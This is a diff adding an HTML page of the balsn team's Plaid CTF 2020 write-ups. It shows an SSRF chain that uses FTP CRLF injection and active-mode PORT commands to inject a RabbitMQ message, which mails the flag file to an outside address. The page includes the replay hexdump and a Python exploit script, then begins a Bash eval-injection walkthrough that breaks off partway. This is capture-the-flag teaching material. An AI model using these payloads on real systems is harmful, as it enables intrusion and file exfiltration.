@@ -1,0 +1,421 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Plaid CTF 2020</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#contrived-web-problem">contrived-web-problem</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#json-bourne">json-bourne</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#contrived-web-problem" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">contrived-web-problem</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#json-bourne" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">json-bourne</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="plaid-ctf-2020"><a class="header-link" href="#plaid-ctf-2020"></a>Plaid CTF 2020</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="contrived-web-problem"><a class="header-link" href="#contrived-web-problem"></a>Contrived Web Problem</h3>
+<blockquote>
+<p>bookgin</p>
+</blockquote>
+<p>This write-up is intended to be lengthy. The challenge itself is not that difficult, but I would like to share more about how I make progress and come out with next step.</p>
+<p>This contrived challenge has 6 services in the dockerfile:</p>
+<ol class="list">
+<li>postgres: database backend</li>
+<li>rabbit: rabbitmq server serves as an email queue</li>
+<li>ftp: ftp server stores user&#39;s profile images</li>
+<li>frontend server: the web server frontend; most are static files.</li>
+<li>backend api: the web server backend handling most of the logic. The frontend server will proxy the route <code>/api</code> to this backend api server.</li>
+<li>email: email server will fetch email task from rabbit.</li>
+</ol>
+<p>The flag file <code>/flag.txt</code> are present in frontend server, email and backend api. This is very important because it&#39;s not much useful to exploit the server without flag.</p>
+<h4 id="the-weapon:-ssrf"><a class="header-link" href="#the-weapon:-ssrf"></a>The Weapon: SSRF</h4>
+<p>Because backend api handles the logic, We start from this service first. A quick look on the source we quickly identify a SSRF vulnerability:</p>
+<pre class="hljs"><code>/api/image?url=ftp://ftp:21/user/975b893d<span class="hljs-string">-7</span>b0e<span class="hljs-string">-4091</span><span class="hljs-string">-8356</span><span class="hljs-string">-46</span>b24fa43818/profile.png</code></pre><p>The source code snippet:</p>
+<pre class="hljs"><code>        <span class="hljs-keyword">let</span> parsed = <span class="hljs-keyword">new</span> URL(url);
+
+        <span class="hljs-keyword">let</span> image: Buffer;
+        <span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">"http:"</span> || parsed.protocol === <span class="hljs-string">"https:"</span>) {
+            <span class="hljs-keyword">const</span> imageReq = <span class="hljs-keyword">await</span> fetch(parsed.toString(), { <span class="hljs-attr">method</span>: <span class="hljs-string">"GET"</span> }); 
+            image = <span class="hljs-keyword">await</span> (imageReq <span class="hljs-keyword">as</span> any).buffer();
+        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">"ftp:"</span>) {
+            <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);
+            <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);
+            <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);
+            <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({
+                <span class="hljs-attr">host</span>: parsed.hostname,
+                <span class="hljs-attr">port</span>: parsed.port !== <span class="hljs-string">""</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,
+                <span class="hljs-attr">user</span>: username !== <span class="hljs-string">""</span> ? username : <span class="hljs-literal">undefined</span>,
+                <span class="hljs-attr">password</span>: password !== <span class="hljs-string">""</span> ? password : <span class="hljs-literal">undefined</span>,
+            }); 
+            image = <span class="hljs-keyword">await</span> ftpClient.get(filename);
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">"Bad image url"</span>);
+        } 
+
+        <span class="hljs-keyword">if</span> (!isPNG(image)) {
+            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">"Bad image (not a png)"</span>);
+        }
+
+        res.type(<span class="hljs-string">".png"</span>).status(<span class="hljs-number">200</span>).send(image);</code></pre><p>Since those services are in LAN, the SSRF vulnerability is very useful. WE can simply use SSRF to smuggle protocol to any of the service.</p>
+<p>However, the SSRF here is not that powerful. Regarding HTTP-based SSRF, the library is use <code>isomorphic-fetch</code>, which depends on <code>node-fetch</code>. We can&#39;t do much by simply controlling URL here, and we didn&#39;t find any CRLF in the library either. What&#39;s worse the HTTP method is limited in GET. Smuggling the payload in POST body is not possible. For GET, non-printable characters will be percent-encoded.</p>
+<p>For FTP-based SSRF, the problem is FTP is a stateful protocol. Unlike HTTP protocol, in FTP the server has to greet the client first <code>200 OK\r\n</code> and then the client will proceed to send the username information <code>USER anonymous\r\n</code>.</p>
+<p>In other words, even though we can control the destination host, unless the victim server sends something first, the TCP connection will just idle there. Both server and client are awaiting each other.</p>
+<h4 id="identify-the-target"><a class="header-link" href="#identify-the-target"></a>Identify the Target</h4>
+<p>Even with limited SSRF capability, let&#39;s identify possible targets. By default RabbitMQ has <a href="https://www.rabbitmq.com/networking.html">multiple open ports</a>.</p>
+<ol class="list">
+<li>postgres 5432: but we have no idea of the database name, username, password.</li>
+<li>rabbit 4369: EPMD protocol. <a href="https://www.rabbitmq.com/networking.html">a peer discovery service used by RabbitMQ nodes and CLI tools</a>, but it doesn&#39;t seem to be useful</li>
+<li>rabbit 5672: AMQP protocol. When the backend api adds a new email, it will communicate with this port. This could be exploitable.</li>
+<li>rabbit 15672: HTTP management server for rabbitMQ. The HTTP API is using HTTP Basic Auth so it&#39;s very suitable for our SSRF target.</li>
+<li>rabbit 25672: Erlang distribution server port. It seems like it&#39;s used by <a href="https://www.rabbitmq.com/networking.html">internal CLI tools</a>, and we don&#39;t think it&#39;s interesting.</li>
+<li>ftp 21: The flag is not in FTP server. Even if we can retrieve files from FTP, it&#39;s not much useful.</li>
+<li>frontend server: there is no reason to exploit the server from internal network. We can connect all API from WAN.</li>
+<li>backend api: there is no reason to exploit the server from internal network. We can connect all API from <code>/api</code> via frontend server.</li>
+<li>email: there is no listening port.</li>
+</ol>
+<p>So the most promising target is rabbitmq, but let&#39;s recall the flag path again because not all servers have flag file. The flag file <code>/flag.txt</code> are present in frontend server, email and backend api. rabbitmq has no flag.</p>
+<p>But don&#39;t forget rabbitmq servers as the email queue. If we can poison or inject some data into rabbitmq, we can make the email server send something out. Let&#39;s dive in the source code of email server first:</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();
+    channel.consume(<span class="hljs-string">"email"</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {
+        <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {
+            <span class="hljs-keyword">return</span>;
+        } 
+        channel.ack(msg);
+
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());
+            <span class="hljs-keyword">await</span> transport.sendMail({
+                <span class="hljs-attr">from</span>: <span class="hljs-string">"plaid2020problem@gmail.com"</span>,
+                <span class="hljs-attr">subject</span>: <span class="hljs-string">"Your Account"</span>,
+                ...data,
+            }); 
+        } <span class="hljs-keyword">catch</span> (e) {
+            <span class="hljs-built_in">console</span>.error(e);
+        } 
+    })</code></pre><p>The triple dot is called <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax">Spread syntax</a>. Basically if we can inject the data into rabbitmq, we can control the object. In the <a href="https://nodemailer.com/message/"><code>transport.sendMail</code> document</a>, we can insert <code>attachments</code> and <code>to</code> to exfiltrate any file to our mail account in the email server.</p>
+<p>Does it ring a bell? The email server contains the flag!</p>
+<h4 id="make-ssrf-great-again-with-active-ftp"><a class="header-link" href="#make-ssrf-great-again-with-active-ftp"></a>Make SSRF Great Again with Active FTP</h4>
+<p>The idea is clear now: use SSRF to poison the data <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>into rabbitmq, and just check the flag in the email.</p>
+<p>However, either rabbitmq AMQP protocol or rabbitmq HTTP API requires pretty complicated payload to exploit. This is definitely not doable via HTTP-based SSRF.</p>
+<p>The only hope, FTP-based SSRF, requires the remote server to send something first. Both AMQP and HTTP API won&#39;t greet the client first.</p>
+<p>Which protocol greet the client? Of couse, the FTP server itself. Can we leverage ftp server to sharpen our SSRF?</p>
+<p>FTP server has 2 modes, active and passive mode respectively. <a href="https://slacksite.com/other/ftp.html#actexample">This website</a> explains them clearly with raw payload.</p>
+<p>To sum up:</p>
+<p>In active mode:</p>
+<ul class="list">
+<li>Download (RETR): the client specifies IP and the server sends the file to it.</li>
+<li>Upload (STOR): the client specifies IP and the server retrieves the file from it.</li>
+</ul>
+<p>In passive mode:</p>
+<ul class="list">
+<li>Download (RETR): the server specifies IP and the client retrieves the file from it.</li>
+<li>Upload (STOR): the server specifies IP and the client sends the file to it.</li>
+</ul>
+<p>Therefore only active download or passive upload can work here. For passive upload, because the vulnerable SSRF command for client is download (STOR), the client will not initial the connection to the IP.</p>
+<p>But for active download, if we can make the FTP client specify the SSRF target and send RETR, the server will send the file to the target.</p>
+<p>The <a href="https://github.com/mscdex/node-ftp">ftp-client</a> is vulnerable to CRLF injections. We can easily craft a payload to trick the server to send <code>test.txt</code> to <code>127.0.0.1:1024</code>.</p>
+<pre class="hljs"><code>await ftp_client.get("foo<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>PORT 127,0,0,1,4,0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>RETR test.txt<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>");</code></pre><p>When uploading file, the server will check whether the first a few bytes starts with PNG header. This can be easily bypassed via FTP active download. The following payload will track the server to download <code>255.255.255.255:1024</code> and save to <code>test.txt</code>. (It seems like some teams didn&#39;t bypass this but still managed to solve the challenge.)</p>
+<pre class="hljs"><code>await ftp_client.get("foo<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>PORT 255,255,255,255,4,0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>STOR text.txt<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>");</code></pre><p>Okay, we have a relatively powerful SSRF now. There is no need to smuggle any protocol. We can send any TCP content we want!</p>
+<h4 id="craft-the-ssrf-payload"><a class="header-link" href="#craft-the-ssrf-payload"></a>Craft the SSRF Payload</h4>
+<p>We have two options here:</p>
+<ol class="list">
+<li>rabbit 5672: AMQP protocol</li>
+<li>rabbit 15672: HTTP management server for rabbitMQ.</li>
+</ol>
+<p>We choose the first one. The AMQP protocol seems to be required interaction, but it can still work when I just record and replay all the payload together. For option 2 you can refer to other <a href="https://ctftime.org/task/11323">write-ups in CTFTime</a>.</p>
+<p>We use wireshark to record the payload to rabbit port 5672.</p>
+<pre class="hljs"><code><span class="hljs-number">00000000</span>: <span class="hljs-number">414d</span> <span class="hljs-number">5150 0000</span> <span class="hljs-number">0901 0100</span> <span class="hljs-number">0000 0001</span> <span class="hljs-number">3800</span>  AMQP..........<span class="hljs-number">8</span>.
+<span class="hljs-number">00000010</span>: <span class="hljs-number">0a00 0b00</span> <span class="hljs-number">0001 1607</span> <span class="hljs-number">7072 6f64</span> <span class="hljs-number">7563 7453</span>  ........productS
+<span class="hljs-number">00000020</span>: <span class="hljs-number">0000 0007</span> <span class="hljs-number">616d</span> <span class="hljs-number">7170 6c69</span> <span class="hljs-number">6207 7665</span> <span class="hljs-number">7273</span>  ....amqplib.vers
+<span class="hljs-number">00000030</span>: <span class="hljs-number">696</span>f <span class="hljs-number">6e53 0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">302</span>e <span class="hljs-number">352</span>e <span class="hljs-number">3508</span> <span class="hljs-number">706</span>c  ionS....<span class="hljs-number">0</span>.<span class="hljs-number">5</span>.<span class="hljs-number">5</span>.pl
+<span class="hljs-number">00000040</span>: <span class="hljs-number">6174</span> <span class="hljs-number">666</span>f <span class="hljs-number">726d</span> <span class="hljs-number">5300 0000</span> <span class="hljs-number">104</span>e <span class="hljs-number">6</span>f64 <span class="hljs-number">652</span>e  atformS....Node.
+<span class="hljs-number">00000050</span>: <span class="hljs-number">4a53 2076</span> <span class="hljs-number">3133 2e31</span> <span class="hljs-number">332</span>e <span class="hljs-number">300</span>b <span class="hljs-number">696</span>e <span class="hljs-number">666</span>f  JS v13.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>.info
+<span class="hljs-number">00000060</span>: <span class="hljs-number">726d</span> <span class="hljs-number">6174</span> <span class="hljs-number">696</span>f <span class="hljs-number">6e53 0000</span> <span class="hljs-number">0023 6874</span> <span class="hljs-number">7470</span>  rmationS...#http
+<span class="hljs-number">00000070</span>: <span class="hljs-number">3</span>a2f <span class="hljs-number">2f73 7175</span> <span class="hljs-number">6172</span> <span class="hljs-number">656d</span> <span class="hljs-number">6</span>f2e <span class="hljs-number">6769 7468</span>  ://squaremo.gith
+<span class="hljs-number">00000080</span>: <span class="hljs-number">7562 2e69</span> <span class="hljs-number">6</span>f2f <span class="hljs-number">616d</span> <span class="hljs-number">7170</span> <span class="hljs-number">2</span>e6e <span class="hljs-number">6</span>f64 <span class="hljs-number">650</span>c  ub.io/amqp.node.
+<span class="hljs-number">00000090</span>: <span class="hljs-number">6361 7061</span> <span class="hljs-number">6269 6c69</span> <span class="hljs-number">7469 6573</span> <span class="hljs-number">4600 0000</span>  capabilitiesF...
+<span class="hljs-number">000000a0</span>: <span class="hljs-number">8c12 7075</span> <span class="hljs-number">626</span>c <span class="hljs-number">6973 6865</span> <span class="hljs-number">725</span>f <span class="hljs-number">636</span>f <span class="hljs-number">6</span>e66  ..publisher_conf
+<span class="hljs-number">000000b0</span>: <span class="hljs-number">6972 6d73</span> <span class="hljs-number">7401 1a65</span> <span class="hljs-number">7863 6861</span> <span class="hljs-number">6</span>e67 <span class="hljs-number">655</span>f  irmst..exchange_
+<span class="hljs-number">000000c0</span>: <span class="hljs-number">6578 6368</span> <span class="hljs-number">616</span>e <span class="hljs-number">6765 5f62</span> <span class="hljs-number">696</span>e <span class="hljs-number">6469 6e67</span>  exchange_binding
+<span class="hljs-number">000000d0</span>: <span class="hljs-number">7374</span> <span class="hljs-number">010</span>a <span class="hljs-number">6261 7369</span> <span class="hljs-number">632</span>e <span class="hljs-number">6</span>e61 <span class="hljs-number">636</span>b <span class="hljs-number">7401</span>  st..basic.nackt.
+<span class="hljs-number">000000e0</span>: <span class="hljs-number">1663</span> <span class="hljs-number">6</span>f6e <span class="hljs-number">7375 6d65</span> <span class="hljs-number">725</span>f <span class="hljs-number">6361 6e63</span> <span class="hljs-number">656</span>c  .consumer_cancel
+<span class="hljs-number">000000f0</span>: <span class="hljs-number">5</span>f6e <span class="hljs-number">6f74 6966</span> <span class="hljs-number">7974 0112</span> <span class="hljs-number">636</span>f <span class="hljs-number">6</span>e6e <span class="hljs-number">6563</span>  _notifyt..connec
+<span class="hljs-number">00000100</span>: <span class="hljs-number">7469</span> <span class="hljs-number">6</span>f6e <span class="hljs-number">2</span>e62 <span class="hljs-number">6</span>c6f <span class="hljs-number">636</span>b <span class="hljs-number">6564 7401</span> <span class="hljs-number">1</span>c61  tion.blockedt..a
+<span class="hljs-number">00000110</span>: <span class="hljs-number">7574 6865</span> <span class="hljs-number">6e74 6963</span> <span class="hljs-number">6174</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e5f <span class="hljs-number">6661</span>  uthentication_fa
+<span class="hljs-number">00000120</span>: <span class="hljs-number">696</span>c <span class="hljs-number">7572</span> <span class="hljs-number">655</span>f <span class="hljs-number">636</span>c <span class="hljs-number">6f73 6574</span> <span class="hljs-number">0105</span> <span class="hljs-number">504</span>c  ilure_closet..PL
+<span class="hljs-number">00000130</span>: <span class="hljs-number">4149 4e00</span> <span class="hljs-number">0000 0a00</span> <span class="hljs-number">7465 7374</span> <span class="hljs-number">0074 6573</span>  AIN.....test.tes
+<span class="hljs-number">00000140</span>: <span class="hljs-number">7405</span> <span class="hljs-number">656</span>e <span class="hljs-number">5</span>f55 <span class="hljs-number">53</span>ce <span class="hljs-number">0100 0000</span> <span class="hljs-number">0000 0c00</span>  t.en_US.........
+<span class="hljs-number">00000150</span>: <span class="hljs-number">0a00 1f07</span> ff00 <span class="hljs-number">0010 0000</span> <span class="hljs-number">3</span>cce <span class="hljs-number">0100 0000</span>  ..........&lt;.....
+<span class="hljs-number">00000160</span>: <span class="hljs-number">0000 0800</span> <span class="hljs-number">0a00 2801</span> <span class="hljs-number">2</span>f00 <span class="hljs-number">00</span>ce <span class="hljs-number">0100 0100</span>  ......(./.......
+<span class="hljs-number">00000170</span>: <span class="hljs-number">0000 0500</span> <span class="hljs-number">1400 0a00</span> ce01 <span class="hljs-number">0001 0000</span> <span class="hljs-number">000</span>e  ................
+<span class="hljs-number">00000180</span>: <span class="hljs-number">003</span>c <span class="hljs-number">0028 0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">656d</span> <span class="hljs-number">6169 6c00</span> ce02  .&lt;.(....email...
+<span class="hljs-number">00000190</span>: <span class="hljs-number">0001 0000</span> <span class="hljs-number">0012</span> <span class="hljs-number">003</span>c <span class="hljs-number">0000 0000</span> <span class="hljs-number">0000 0000</span>  .......&lt;........
+<span class="hljs-number">000001a0</span>: <span class="hljs-number">0051 2000</span> <span class="hljs-number">0000 0000</span> ce03 <span class="hljs-number">0001 0000</span> <span class="hljs-number">0051</span>  .Q ............Q
+<span class="hljs-number">000001b0</span>: <span class="hljs-number">7</span>b22 <span class="hljs-number">746</span>f <span class="hljs-number">223</span>a <span class="hljs-number">2262</span> <span class="hljs-number">616</span>c <span class="hljs-number">736</span>e <span class="hljs-number">6374 6640</span>  {"to":"balsnctf@
+<span class="hljs-number">000001c0</span>: <span class="hljs-number">6578</span> <span class="hljs-number">616d</span> <span class="hljs-number">706</span>c <span class="hljs-number">652</span>e <span class="hljs-number">636</span>f <span class="hljs-number">6d22 2c22</span> <span class="hljs-number">7465</span>  example.com","te
+<span class="hljs-number">000001d0</span>: <span class="hljs-number">7874</span> <span class="hljs-number">223</span>a <span class="hljs-number">2250</span> <span class="hljs-number">574</span>e <span class="hljs-number">4544</span> <span class="hljs-number">222</span>c <span class="hljs-number">2261 7474</span>  xt":"PWNED","att
+<span class="hljs-number">000001e0</span>: <span class="hljs-number">6163</span> <span class="hljs-number">686d</span> <span class="hljs-number">656</span>e <span class="hljs-number">7473</span> <span class="hljs-number">223</span>a <span class="hljs-number">5</span>b7b <span class="hljs-number">2270 6174</span>  achments":[{"pat
+<span class="hljs-number">000001f0</span>: <span class="hljs-number">6822 3a22</span> <span class="hljs-number">2f66 6c61</span> <span class="hljs-number">672</span>e <span class="hljs-number">7478 7422</span> <span class="hljs-number">7d</span>5d  h":"/flag.txt"}]
+<span class="hljs-number">00000200</span>: <span class="hljs-number">7d</span>ce                                     }.</code></pre><p>Replay the payload will insert <code>{&quot;to&quot;:&quot;balsnctf@example.com&quot;,&quot;text&quot;:&quot;PWNED&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}</code> into rabbitmq. It has a low probability to fail to insert a new record.</p>
+<p>Here is the script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests, secrets, base64, re
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+
+s = requests.session()
+
+u = <span class="hljs-string">'http://contrived.pwni.ng/api/'</span>
+<span class="hljs-keyword">try</span>:
+    r = s.get(u+<span class="hljs-string">'image'</span>, params=dict(url=<span class="hljs-string">"ftp://ftp:21/"</span>+quote(<span class="hljs-string">"foo\r\nbar\r\nPORT 255,255,255,255,4,0\r\nSTOR /http.txt\r\n"</span>)), timeout=<span class="hljs-number">5</span>)
+<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+    print(e)
+<span class="hljs-keyword">try</span>:
+    r = s.get(u+<span class="hljs-string">'image'</span>, params=dict(url=<span class="hljs-string">"ftp://ftp:21/"</span>+quote(<span class="hljs-string">"foo\r\nbar\r\nPORT 172,32,56,72,22,40\r\nRETR /http.txt\r\n"</span>)), timeout=<span class="hljs-number">5</span>)
+<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+    print(e)</code></pre><p>Check the email and profit!</p>
+<p class="img-container"><img src="https://i.imgur.com/DdMa59A.png" alt=""></p>
+<p><code>PCTF{not_that_contrived_i_guess}</code></p>
+<p>By the way, I spent 2+ hours on debugging only to find out I type the incorrect internel IP address......</p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="json-bourne"><a class="header-link" href="#json-bourne"></a>JSON Bourne</h3>
+<p>This is a Bash command injection challenge. Quickly browse the code and find this interesting:</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">for</span> (( task_i=0; task_i &lt; <span class="hljs-variable">${#result_str}</span>; task_i++ )); <span class="hljs-keyword">do</span>
+        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">${result_str:$task_i:5}</span>"</span> = <span class="hljs-string">"task "</span> ]]; <span class="hljs-keyword">then</span>
+            <span class="hljs-built_in">local</span> suffix=<span class="hljs-string">"<span class="hljs-variable">${result_str:$((task_i+5)):$((${#result_str}</span>-task_i-5))}"</span>
+            <span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$((suffix &gt; 0)</span>)"</span> = <span class="hljs-string">"1"</span> &amp;&amp; <span class="hljs-string">"<span class="hljs-variable">$((suffix &lt;= 8)</span>)"</span> = <span class="hljs-string">"1"</span> ]]; <span class="hljs-keyword">then</span>
+                <span class="hljs-built_in">local</span> color=<span class="hljs-variable">$var_name</span>
+                normalizeNumber <span class="hljs-string">"<span class="hljs-variable">$suffix</span>"</span> <span class="hljs-variable">$color</span> <span class="hljs-string">"var_"</span>
+                <span class="hljs-built_in">eval</span> <span class="hljs-variable">${res}</span><span class="hljs-string">'[_color]=${color}'</span>
+            <span class="hljs-keyword">fi</span>
+        <span class="hljs-keyword">fi</span>
+    <span class="hljs-keyword">done</span></code></pre><p>So if we have string prefixed with <code>task</code>, the <code>$suffix</code> will become the word after it.</p>
+<p>Example:</p>
+<pre class="hljs"><code>{<span class="hljs-string">"task abc"</span><span class="hljs-symbol">:<span class="hljs-string">""</span></span>}
+
+$suffix = <span class="hljs-string">"abc"</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-string">""</span>$((<span class="hljs-string">"abc"</span> &gt; <span class="hljs-number">0</span>))<span class="hljs-string">""</span> ...</code></pre><p>This is the most promising injection point, but even the <a href="https://www.tldp.org/LDP/abs/html/ivr.html#IVRREF">Indirect Variable References</a> is not able to achieve command injection here. With this syntax we can retrieve environment variable at most.</p>
+<pre class="hljs"><code>{<span class="hljs-string">"task PATH"</span><span class="hljs-symbol">:<span class="hljs-string">""</span></span>}
+
